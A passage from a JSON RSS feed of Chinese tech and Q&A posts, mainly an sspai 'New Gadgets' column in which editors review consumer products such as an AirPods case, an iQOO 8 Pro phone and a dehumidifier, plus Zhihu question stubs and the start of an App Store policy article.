href=\"https://sspai.com/post/68527\" target=\"_blank\">🎓 监管信息是怎样「剧透」Apple 产品的</a></li>\n<li><a href=\"https://sspai.com/post/68571\" target=\"_blank\">⛓️ Apple 向开发者的一次「大让步」：App Store 即将迎来重要更新</a></li>\n<li><a href=\"https://sspai.com/post/68584\" target=\"_blank\">🌟 新玩意 076｜少数派的编辑们最近买了啥？</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68591"},{"title":"70多年前，奔向鸭绿江的他们正年轻，关于他们你知道哪些舍生忘死的故事？","date":"2021-09-02 15:05:42","description":"\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/xin-hua-she-3?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">新华社</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/483039319/answer/2097015111?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">10 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/20841303?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如果朝韩再发生一次战争，你愿意去当抗美援朝的志愿军吗?</a><br><a href=\"http://www.zhihu.com/question/31387813?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">军事演习真的能反映出战场上可能出现的问题吗？</a><br>\n","link":"http://www.zhihu.com/question/483039319/answer/2097015111?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"新玩意 076｜少数派的编辑们最近买了啥？","date":"2021-09-02 09:27:41","description":"\n<h4>关于栏目</h4>\n<p>很多读者都会好奇少数派的编辑们到底平时都「买了啥」。我们希望通过「编辑部的新玩意」介绍编辑部成员们最近在用的新奇产品，让他们自己来谈谈这些新玩意的使用体验究竟如何。</p>\n<hr>\n<h2>@老麦：决色 AirPods Pro 保护壳</h2>\n<ul>\n<li>入手渠道：京东</li>\n<li>入手价格：150+</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4o8c9lb34t813bf0sn0.jpeg\"></figure><p>这个耳机保护壳，是某天跟网友 @永恒在天 线下见面被安利的，它的特点主要是在壳子上下加了两条铝合金保护板，整体造型更加棱角分明，官方说是致敬 iPhone 4，感觉有点硬扯。同时标配了一个铝合金登山扣，但这个扣子跟壳体摩擦的声音特别响，我还是换上少数派自家的手绳好一点。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/02/8b475a9f67f116f37cd0fa76051e576e.png\"></figure><p>壳体本身还是塑料材质，官方说是拜耳 PC，这个不太懂。但壳体内侧加了两个阻尼橡胶，所以既能固定，又很容易取出，这点算是设计好评，而我另一个 NOMAD 真皮壳子，基本就算跟耳机长在一起了，很难拿下来。上盖部分，还是采用了一点胶布来固定，但还是可以取下来的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4o8calb34t82dsrfke0.jpeg\"></figure><p>官方宣传的卖点是耐摔，我用了两个月，确实掉过几次，保护性还是挺好的，但 AirPods 自身结构紧密，抗摔能力就很强，加上这个壳子内侧的胶垫，让耳机产生了一定的悬空间隙，估计确实能有一定的缓冲保护作用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4o8catb34t813bf0sng.jpeg\"></figure><p>最后说说品牌和价格，决色看起来也是本土出海品牌，之前应该买过它们家外壳产品，但没有这么贵，估计是这几年在转型高端了，这基本也是大部分国内厂商的必经过程。原价 198 确实不便宜，各种折扣下来 150 多，我觉得还是能够接受的，但如果壳体表面材质可以做得再有质感一点，会有额外加分。</p>\n<h2>@Lotta：阅读书架</h2>\n<ul>\n<li>入手渠道：淘宝</li>\n<li>参考价格：30 元</li>\n</ul>\n<p>购买这款书架的初衷是不想低着头看书，但小时候用的传统书架只在底部有一个档条，很难固定比较厚的书页，所以就买了这款中间有夹子的阅读书架。塑料质地，没有异味，长 23cm、宽 19.5cm，也是比较方便携带的大小。中间有凹进去的竖槽来安放书脊，架腿支撑稳固，架脚有防滑垫，中间青色的旋转轴还可以进行多角度调节，想调成和桌面平行的水平状态也可以。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/09/02/e774b5fefc3ea01977e439a37bcfcae0.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/09/02/187f02a9c744775b208bf90ae7f61bba.jpeg\" alt=\"\"></figure><p>除了稳固，这款书架能够支持的书籍类型也更广，夹子可以夹的厚度能够达到四五百页，两边的夹子完全展开也可以达到 47cm 左右，底部和顶端也有辅助的支撑条可以展开，也能够支撑杂志一类版面较大的书籍。底部中间和两边凸出来的撑板有 2cm 左右，除了在阅读场景下用来架纸质书和 Kindle，也可以架手机和 iPad 来背（kan）单（shi）词（pin）。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c4o8c6tb34t82dsrfkbg.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c4o8c75b34t82dsrfkc0.jpeg\" alt=\"\"></figure><p>虽然这个书架的外观设计可能看起来有一点点幼稚，因为它的主打市场是儿童，全名「多功能儿童阅读书架」，但非常实用，不管多大年龄都要爱护自己的颈椎啊。</p>\n<h2>@Tp：iQOO 8 Pro</h2>\n<ul>\n<li>入手渠道：克老给的</li>\n<li>入手价格：2.5 小时工时</li>\n</ul>\n<p>作为一个 iPhone 老用户，国产 Android 给我留下的依然是「不流畅」「广告多」等刻板印象。因此在拿到 iQOO 8 Pro 之前，我仍有些许担忧。不过，iQOO 8 Pro 的表现打消了我的疑虑，甚至还让我感到有些惊艳。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4o8c7db34t82dsrfkcg.jpeg\"></figure><p>初上手 OriginOS 时，我多少有被它独特的桌面吸引到。OriginOS 的桌面既有 iOS 的「规矩」也有 Android 的「自由」，无论是应用还是「原子组件」都会用统一的圆角矩形来展示。同时，系统也为第三方应用提供了图标重绘的选项，可以让桌面观感更加统一。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4o8c7tb34t82dsrfkd0.jpeg\"></figure><p>值得一提的是，OriginOS 虽然内置了广告和推荐，但关闭的方法也并不复杂，只要到对应功能的设置里关闭即可。广告开关藏得也不会特别深，至少我在没找教程的情况下，也实现「纯净版」的效果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4o8c85b34t82dsrfkdg.jpeg\"></figure><p>iQOO 8 Pro 最惊艳到我的其实是它的指纹识别体验，我过去不看好屏下指纹的原因在于，缺乏实体按键的辅助定位，如果要将手准确地按到识别区有一定难度。</p>\n<p>而 iQOO 8 Pro 采用的超声波指纹识别技术则扩大了指纹识别区，只要手指按在特定区域中，哪怕位置很偏，系统也能准确识别并解锁。录入指纹也不需要像传统指纹识别那样反复点按，最快只需要按一下就可以完成录入，非常方便。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4o8c8lb34t818p9alrg.gif\"></figure><p>我原本对 AI 修图是有排斥心理的，因为 AI 修图后的照片，在手动修图时往往需要花费更多时间。不过在体验了 iQOO 8 Pro 的相机后，AI 修图反而可以让我拍照分享时更加轻松。</p>\n<p>相比于追求「人眼所见」的 iPhone，iQOO 对照片的追求则更倾向于「好看」。如果单单只是发个朋友圈、给他人晒晒日常，AI 修图后的照片完全够用了。</p>\n<p>下面这几张食物图，我都是直接用系统相机进行拍摄，并且没有进行手动修图的。iQOO 8 Pro 可以很好地识别出「美食」场景，随后自动对照片进行优化。拍完之后直接发到朋友圈，完全可以跳过手动修图这一步。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4o8c95b34t82k08g8cg.jpeg\"></figure><p>总体而言，iQOO 8 Pro 确实是一款让我对国产 Android 改观的手机。同时，它对骁龙 888 的发热控制也做得比较好。除了在刚激活后、玩游戏时有明显发热外，在日常使用中基本没遇到发热严重的问题（可能因为我使用的强度不够大 🌝）。即使用自带的 120W 充电器充电，也不会有发烫的问题。</p>\n<p>如果你问我下一台主力机还会不会选择 iPhone，我想答案是肯定的。尽管 iQOO 8 Pro 有不少惊艳到我的地方，但它依然没法融入到我基于 Apple 生态的工作流之中。不过，它确实让我对国产 Android 有所改观，在选择备机时，我或许会有不同的答案。</p>\n<h2>@北鸮：几素自动感应洗手机</h2>\n<ul>\n<li>入手渠道：天猫旗舰店</li>\n<li>参考价格：99 元</li>\n</ul>\n<p>买一个自动洗手液机的想法是在一次满手肉油去按洗手液泵头，一个手滑把瓶子按翻之后产生的。那次洗手洗得相当惨烈，洗手液没挤出来，手上的油都糊在了瓶子上，洗完手还得洗瓶子，子子孙孙无穷尽。好在自动洗手液机的价格已经不贵了，我不需要耗费太多成本就能给免接触洗手体验一个机会。</p>\n<p>我在选择商品时一共只有两个标准：一是能自己更换洗手液，因为我不太喜欢被特定规格瓶子强买强卖的感觉；二是长得我能相中，毕竟我需要的只有「自动出洗手液」一个功能，剩下的都是锦上添花，好看才是能让它长久留存台面的精髓。最终，我下单了几素的自动感应洗手机，机器价格 99 元，送一袋 300ml 的威露士抑菌洗手液。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4o8cblb34t813bf0so0.jpeg\"></figure><p>到手后，外观和商品页面没什么差别，方方正正，看起来很稳妥。储液盒可以轻松拆下，电池仓就在储液盒后。商品介绍表示四节五号电池可以供一家人使用九个月，这个续航足以让我忽略拆盒换电池时可能需要的擦洗。</p>\n<p>在基本的功能之外，这个机器额外添加了灯光提醒。在感应出泡之后，指示灯会闪烁 15s 提示洗手时长——这个时长其实挺尴尬的。因为无需冲水的干式洗手推荐时长是 20s，需要水的洗手流程一般在 40-60s。不过考虑到如果我认真洗了 15s 可能也会认真地把流程搓完，这个功能也算是没白做。出泡量比较合适，刚刚好涂满双手，泡沫细腻程度也不错。（配套的威露士洗手液我也很喜欢，甚至买了一桶回头给家人分装。）</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/02/7d52f18ee4fd0f2a52ab3c91a787d321.gif\"></figure><p>老实讲，我并没怎么货比三家，选择这款机器主要是因为它是所有确定能自己更换洗手液的机器里，打眼一看外观最喜欢的。但考虑到其他国产品牌类似容量的洗手液机都是这个价格区间，只要好看我就开心了。目前半个月用下来也没什么大的问题，只有一次我在大扫除之后，这个机器好像因为（擦洗过程中我忘了关机）短时间感应了太多次失灵了，插拔电池恢复正常。我不觉得大家都有必要买这个机型，但是自动洗手液机确实可以整一个，尤其是家里有小孩什么的，说不定能达到引诱他们勤洗手的效果。</p>\n<h2>@张奕源 Nick：只轻木糖醇清新漱口水</h2>\n<ul>\n<li>入手渠道：<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=654685978427\" target=\"_blank\">我派淘宝商店</a>\n</li>\n<li>参考价格：￥63 <s>原价 ￥68</s> 两瓶装 ￥95 三瓶装 ￥125</li>\n</ul>\n<p>在此前的《<a href=\"https://sspai.com/post/62330\" target=\"_blank\">用这些技巧保持你的口腔健康，别等到牙齿坏掉才后悔</a>》中，我曾经提及过漱口水对于抑制口腔细菌和清新口气的作用。而我也是漱口水的长期使用者，每天中午在公司吃完饭后，我都会用漱口水清洁一下口腔，或者直接刷牙。得知我有使用漱口水的习惯后，问路给了我一个新玩意儿——只轻木糖醇清新漱口水。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4o8c5db34t813bf0sm0.jpeg\"></figure><p>在此之前，我用过的漱口水大多是几家知名老厂的产品，由于用得久了，所以对各家的产品定位和价格也很熟悉。只轻的出现勾起了我的好奇心，让我很想知道这个国产新品牌的产品力到底如何，于是拿到东西的第一时间我就来了一口，感受一下。</p>\n<p>只轻漱口水的口味和我此前喝过的其它漱口水都不一样，是一种非常非常接近绿箭口香糖的味道，没有明显的苦味，也没有像某些产品一样刻意制造清凉感。在我看来，这是一个即使没有尝试过漱口水的用户都可以接受的口味，而对于我这种连李施德林著名的「辣嘴」漱口水都能接受的老用户来说，这个类似绿箭的味道带有某种奇妙的新鲜，很有意思。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4o8c5tb34t813bf0smg.jpeg\"></figure><p>抑制口腔细菌是只轻在产品功能上的核心卖点，而它实现这一目标的方式是加入了 BioMAPAs 生物抑菌成分。BioMAPAs 其实就是水、丙二醇和乳酸菌发酵物等，并不神秘，其作用原理是让细菌细胞膜失去极化，进而导致细胞外水分子流入，让细菌细胞自溶死亡。市面上大部分漱口水都有类似的功效，只是实际采用的配方和作用原理略有不同。不过，在对比了我近期使用过的几款漱口水之后，只轻漱口水在减少口气方面的功效明显更为突出，而口气又和口腔内细菌有着直接关联，说明只轻在抑菌上的能力确实有一套。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4o8c65b34t82dsrfkag.jpeg\"></figure><p>顺带一提，许多人在口腔溃疡后都会尝试吃维生素、贴意可贴等各种解决办法，但对于口腔溃疡恢复最有效也最重要的方法是保持口腔清洁——如果你能在每次吃东西后都及时刷牙或漱口，让口腔处于相对无菌状态，日常的口腔溃疡都能在三两天内快速恢复。因此，身边常备漱口水、牙具等能有效保护口腔健康。</p>\n<p>另外还要强调一点，只轻瓶身上给出的用法指导是可以刷牙后使用，这个说法不够严谨。刷牙后半小时到一小时内不建议使用漱口水，以免不同产品的成分产生冲突，影响抑菌效果，具体可以参考前文提到的那篇文章。</p>\n<p>眼看又到了换季的时节，如果你出现了口腔敏感、溃疡等问题，或者想要提升一下口腔的清洁度，不妨试试这款只轻木糖醇清新漱口水。</p>\n<h2>@Lemburse：WPC.IZA002 晴雨两用伞</h2>\n<p>想必大家都发现了，最近北方的天气变化十分剧烈。中午出门的时候紫外线指数往往在 9.0 到 10.0，而晚上也会来一场不期而至的暴雨。连着两三天蹭师兄的伞之后，我终于下定决心整一把自己的晴雨两用伞了。</p>\n<p>首先是明确自己的需求。我当然希望一把伞可以应付现实中的各种场景了。经过一番内心权衡排序，我认为我的首要需求是遮晒，挡雨和轻便。次要需求是抗风和伞面，最后的是价格。按照我的消费习惯，我先排除了当下很火但是是五年之内创立的品牌（这是一种图省事的刻板影响，有条件进行调研的可以无视这一条）。依靠朋友推荐和网上查询，我最后从Coolibar 和 Wpc 里面进行二选一。按照我查到的说法，Coolibar 的防晒能力更强，伞下有明显的降温感，但是比较沉重，并且很容易被风吹翻。Wpc 倒是表现比较平均，没有明显的短板。而且它的一款90g的雨伞给我留下了太深刻的影响，所以最后还是选择了 Wpc。</p>\n<p>确定了品牌，后面就很好确定要什么型号了。向客服详细询问002和003的区别之后（虽然几乎没有给出有用的信息），我最终选择了 IZA002。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/12/7bc4e796db6fac01a70873b17478e4fb.png\"><figcaption>伞的长度和 Switch 差不多</figcaption></figure><p>在使用了大概半个月之后，我感觉整体体验还算可以。黑胶带来的 UPF 50+ 的防晒功能就无须质疑了。伞的大小也是恰到好处，对于我 172cm 的身高来说，注意把伞的方向调整到对着太阳的方向就能刚刚好从头到脚全都遮住。太阳在后方的话需要把伞靠在肩上，锁骨会有一点疼。因为没有女朋友，所以没有两个人一起撑伞的体验，不过我估计这种情况下只能遮住大腿以上吧。在遮雨上，应付小雨和无风的中雨也感觉问题不大。伞的重量在 200g 左右，放在包里几乎无感。防风上比我想的差一些，拿着骑车的时候只要来一点风就会乱颤，感觉随时会把我带下车，反向等于督促我安全骑车了（才不是，被迫走路来回于实验室了）。折叠伞的身板还是蛮脆弱的，想要安全地行走在狂风和暴雨之间，果然还是只能靠长柄伞（叹气）。它的伞面非常朴实，商标小到看不见，非常符合我理工直男的身份，这一点在我心里加分了。不过伞面的质感有点像胶皮，收起来很难抚平皱痕，或许对某些朋友是个减分项？</p>\n<p>从我的体验来看，它是一把在各个方面做到平衡的伞。使用起来足够舒适，能够适应生活里大多数的情况，并且日常携带不算负担，我也没有办法对他苛求更多了。</p>\n<h2>@JasperJia：Orbitkey Nest</h2>\n<p><a href=\"https://www.orbitkey.com/\" target=\"_blank\">Orbitkey</a> 是一个位于澳大利亚墨尔本的团队，一直致力于推出整洁收纳相关的创新产品。他们推出的产品，以优雅简洁和富有心思化的设计而驰名。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/f66ad65ee7dcfa09032bb5fbdd006540.png\"><figcaption>目前官网推出的产品，包括钥匙扣，收纳盒，桌垫，蓝牙追踪器等</figcaption></figure><p>Orbitkey 团队最先在 Kickstarter 众筹推出了他们的明星产品（钥匙扣），结果一炮而红。现在，团队注意力从如何最好地整理钥匙转向如何整理办公桌。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/c5ef9e9a90af743be9f40d34d07bfcee.jpeg\"><figcaption>Orbitkey 团队目标就是收纳</figcaption></figure><p>保持桌面整洁有序，对于我来说是一项挑战。我常常为了寻找一只笔，不得不把我桌面上的草稿纸都掀开。我们都知道凌乱的桌面对于工作效率是灾难，但迟迟没有找到一款兼具颜值和性能的收纳利器。</p>\n<p>这个文具盒最大的作用是帮助人们将日常必需品都放在一个地方，并且可以随身携带，作为 everyday carry （EDC）的一部分。但如果仅仅是一个收纳盒，也不值得夸耀。它最为有用的功能是可以定制化你的收纳方案，放什么东西，怎么放，都可以通过六个魔术贴分隔器进行整理。此外，它还带有无线充电的功能。</p>\n<p>这款 <a href=\"https://www.orbitkey.com/collections/orbitkey-nest/products/orbitkey-nest?variant=32535484137568\">产品官网 </a>售价是 109.99 美元，我派水獭也在微博上进行过介绍。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/8fc0c1976698a48f30ebaaa3127b83be.png\"><figcaption>吃派的水獭在微博上也介绍过</figcaption></figure><p>无线充电可能是其他随行收纳盒所不具备的功能。顶盖的左侧有一个无线充电盒，你可以放置任何无线充电设备。你甚至可以把顶盖取下，直接作为一个无线充电板。作为一个使用 USB-C 接口的工具，你真的不需要担心数据线本身。可惜的是，你必须得连上 USB 接口才能充电。如果有内置的电池，就更方便了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/f80cba1a14b2fb5db5002f1bea514a14.jpeg\"><figcaption>无线充电很方便，对了，钥匙扣也是它家的</figcaption></figure><p>同时，你可以使用自带的六个可拆卸的魔术贴隔板，四处移动以适应不同的装备。除了主隔层一面，顶盖的内侧有几个口袋。这些小口袋可以用来放置存储卡、钥匙、名片，甚至护照。还有一个网格小袋，你可以在其中存放数据线、药品、或任何通常放在包中的松散物品。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/4d4afcedb023d5320d3f1185994f7838.jpeg\"><figcaption>老王的收纳展示</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/58dc65504a6002fe3ad575905359d06f.png\"><figcaption>顶盖内测的收纳（来源：官网）</figcaption></figure><p>虽然主要作用是桌面的收纳工具，但它可以完美地作为一个收纳包将你的所有东西放在一起并一次性携带它们。只需要将顶盖和主隔层合上，并且用弹性绳固定，就可以放到包或者随手携带。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/article/52f3de3839d2f936a3ab880de43661d1\" alt=\"轨道钥匙巢\"><figcaption>方便随身携带（来源：Carryology）</figcaption></figure><p>设计方面，顶盖是用光滑细粒的皮革制作而成，质感与颜值兼具。底部则是聚碳酸酯外壳与尼龙聚混色织物，耐脏的同时又防滑。还有一个哑光纹理的锌合金按钮扣，美学上的一个小亮点。优雅的皮革、小巧的压花徽标、柔软的触感材料、优雅和静音的金属硬件让简单的收纳盒上升了一个新台阶。顶盖和底部可以分开使用，外出携带的时候又可以完美地融合。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/a93a95060905b9c197af820e6aa44991.png\"><figcaption>黑色皮革的质感（来源：官网）</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/article/455e156eec0da3ea561c1ff5767ea794\" alt=\"Orbitkey Nest on Desk\"><figcaption>可以分开使用（来源：官网）</figcaption></figure><p>作为一个收纳盒，710 多人民币的价格我还是犹豫了两天才最终拿下。我也试图查找过 Orbitkey Nest 的平价替代品，遗憾的是，我没有找到让我如此心动的产品。目前官网上只有黑色（Black）和灰色（Ash）两种方案可供选择，或许会让人感觉配色过于单调。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/20/article/a3aa7b5e878403317cd60595f1154c8f\" alt=\"Two colour options of the orbitkey nest\"><figcaption>目前只有黑灰两种配色（来源：官网）</figcaption></figure><h2>@会飞的三羊店长：欧井 OJ-128E 家用除湿机 </h2>\n<ul>\n<li>购入渠道：闲鱼</li>\n<li>参考价格：300 元</li>\n</ul>\n<p>重新回到包邮区生活，又住在楼层不高的老小区，家里居高不下的湿度成为了影响起居质量的问题。空调的除湿功能会在达到指定温度后暂停运作，这就让想要干爽体验又不能忍受过低室温的我常常只能在温度和湿度中二选一。</p>\n<p>幸好一位朋友在聊天时提到家中今年买了一台小型抽湿机，梅雨季后墙纸都没有发霉，并一梭子把链接送到了我跟前。于是我在当天外出后找到了附近的闲鱼卖家，直接打车把一台同款二手抽湿机载回了家。</p>\n<p>月初购入它后梅雨季其实已经过去，但抽湿机的使用频率还是很高，开窗通风后的湿度经常还在 70% 以上，尤其这两天的台风笼罩下，不开空调之后湿度会飙到 85%，大半天就能抽满水箱（12L），让我时常怀疑自己是不是住在龙宫。抽湿机自带湿度计，并用不同颜色的指示灯显示当前湿度是偏高（红色）、中等（绿色）还是舒适（蓝色），抽湿机显示的湿度和小米的温湿度计的测量结果存在一些差异（抽湿机测量出的湿度更高），不过也不影响什么就是了。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/07/26/17ad8c40b47dfaf90300dbd064ea44eb.jpeg\"><figcaption>外观及今天一觉醒来的湿度</figcaption></figure><p>抽湿机分为晴天、雨天、烘衣三档，运行功率逐步攀升（噪音也是）。在我二三十平米的房间中，根据天气情况打开「晴天」或「雨天」档一小时左右就能将湿度降到比较舒适的60%上下；烘衣模式下，把洗衣机甩干的衣物完全烘干大概要三四个小时。烘衣模式下的热风可以触摸感知，不过比起简易的热风式烘干机来说温和得多，不会导致房间温度急剧上升。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/07/26/6533e3981fd3b64e2ffb59d55f565448.png\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/07/26/644bcf7453c7a623eb33e3e4cbd100f1.png\" alt=\"\"></figure><p>总的来说，抽湿机最大的好处和我预想的相近，即可以在不调节温度的情况下调节室内湿度，从而拥有宜人的温度和温度，同时也是阴雨天的烘衣好选择。另外，衣橱中衣物潮湿的问题也用它一把子解决了。</p>\n<p>体验到抽湿机的舒适之处之后立马给爸妈也安排了一台，于是我妈发出了以下感慨，所以我决定将抽湿机和盖毯式电热毯一齐列入包邮区必备小家电清单之中（清单随时候补）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/26/bbb5b662918dd355485ac6d97c022fa5.png\"><figcaption>这个微笑就很精髓</figcaption></figure><p>注：抽湿机的功能随着预算上升能拥有更大水箱、更小巧的外型、更强劲的电机以及更静音的体验等等，我以 300 元购入的这台机器算是低端产品，因而噪音偏大、体积和重量都不小，在这里<strong>只是向大家推荐这个品类</strong>，有需要的朋友可以按照自己的预算和面积看看测评再选购。</p>\n<p><strong>如果你也想分享「新玩意」🔉：</strong></p>\n<p>很多读者表示自己也有一些希望分享的有趣产品。为了能让更多读者参与，我们决定在「新玩意」栏目最后添加一个新的版块，邀请大家来 Matrix 社区发表文章分享你的「新玩意」，你只需要：</p>\n<ul>\n<li>在标题中标注「新玩意」</li>\n<li>用 500-1000 字介绍产品</li>\n<li>配上 1-2 张产品的实拍图片</li>\n<li><strong>在网站个人信息中补充支付宝账号</strong></li>\n</ul>\n<p>成功入选栏目还可以得到 108 元的「剁手抚恤金」🧧。如果你有兴趣参与，就赶紧来稿吧！</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a> ，了解更多的新玩意 🆒</p>\n<p>&gt; 特惠、好用的硬件产品，尽在 <a href=\"https://shop549593764.taobao.com/?spm=a230r.7195193.1997079397.2.2ddc7e0bPqKQHc\">少数派sspai官方店铺</a> 🛒</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68584"},{"title":"9月2日，第八批在韩志愿军烈士遗骸运送回国，哪些志愿军的事迹令你印象最深，我们该如何铭记他们？","date":"2021-09-02 09:04:34","description":"\n<p>【迎英雄回家！ 109 位在韩志愿军遗骸今日归国】 9 月 2 日，韩方向中方移交 109 位在韩中国人民志愿军烈士的遗骸及 1226 件相关遗物，即将返回祖国。 2014 年起，韩方已八次向中国移交中国人民志愿军烈士遗骸及遗物。截至 2020 年，已有 716 名在韩中国人民志愿军烈士遗骸回国安葬。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zheng-guan-shi-pin-38?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">正观视频</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/482921104/answer/2098975134?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">775 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/483083790?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">第八批在韩中国人民志愿军烈士遗骸即将回国，送英雄回家，帮烈士寻亲，你有什么线索或建议吗？</a><br><a href=\"http://www.zhihu.com/question/422506524?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">9 月 27 日中韩将交接第七批中国人民志愿军烈士遗骸，你有什么想对英雄说的？</a><br>\n","link":"http://www.zhihu.com/question/482921104/answer/2098975134?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"Apple 向开发者的一次「大让步」：App Store 即将迎来重要更新","date":"2021-09-02 08:03:58","description":"\n<p>8 月 26 日，Apple 发布新闻稿，公布了 App Store 针对开发者政策即将迎来的重大更新，还为新闻媒体与机构推出了「新闻伙伴计划」。</p>\n<p>正如新闻稿所述，此次 App Store 公布的条款主要是为了向小型开发者提供更多灵活性与资源，主要包含以下 7 点内容：</p>\n<blockquote><ul>\n<li>Apple 与开发者认可 App Store 小型企业计划的成功，并同意在至少未来三年内保持此计划现有结构。年收入少于 1 百万美元的企业将继续受益于佣金折扣，规模较大的开发者则需就 App 购买和 App 内支付向 Apple 支付 App Store 标准佣金。</li>\n<li>App Store 搜索一向旨在帮助用户更轻松地发现他们正在寻找的 App。应开发者要求，Apple 同意其搜索结果将继续以下载量、星级评分、文本相关性和用户行为信号等客观特征为基础。此协议将使当前的 App Store 搜索系统在至少未来三年内保持现状。</li>\n<li>为帮助开发者更加灵活地触达顾客，Apple 将申明，开发者可以使用电子邮件等通信方式与用户共享 iOS App 之外的支付方式信息。和以往一样，开发者不需要因发生在他们的 App 或 App Store 之外的任何购买向 Apple 支付佣金。相关通信必须得到用户同意，且确保用户有权选择退出。</li>\n<li>Apple 还将把开发者可用于订阅、App 内购买和付费 App 的价格点数量从少于 100 个扩展到多于 500 个。开发者可以继续自行设定价格。</li>\n<li>Apple 将为开发者保留以不公对待为由就未通过审核 App 申请复议的选项。事实证明，这是一项成功的机制。Apple 同意向 App 审核网站 添加内容，帮助开发者理解申诉程序的机制。</li>\n<li>在过去七年中，Apple 通过 apple.com 提供了大量关于 App Store 的新信息。Apple 同意基于这些数据创建年度透明度报告，以公开 App 审核机制的详实数据，包括出于各种原因遭拒的 App 数量、禁用的顾客与开发者账号数量、涉及搜索请求与结果的客观数据，以及从 App Store 移除的 App 数量。</li>\n<li>Apple 